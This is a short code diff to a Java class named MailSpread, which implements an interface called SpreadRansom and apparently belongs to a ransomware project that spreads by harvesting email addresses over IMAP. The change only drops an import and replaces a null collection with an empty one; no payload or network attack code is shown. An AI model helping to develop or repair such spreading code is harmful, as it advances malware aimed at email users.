@@ -1,6 +1,5 @@
 package Agent.SpreadR;
 
-import java.util.Collection;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.net.URL;
@@ -20,7 +19,7 @@ public class MailSpread implements SpreadRansom {
 		String provider = "imap";  
 
 		// Collection of Mail addresses
-		Collection<String> emails = null;
+		Collection<String> emails =Collections.emptySet();
 
 		try {
 			// Connect to the server
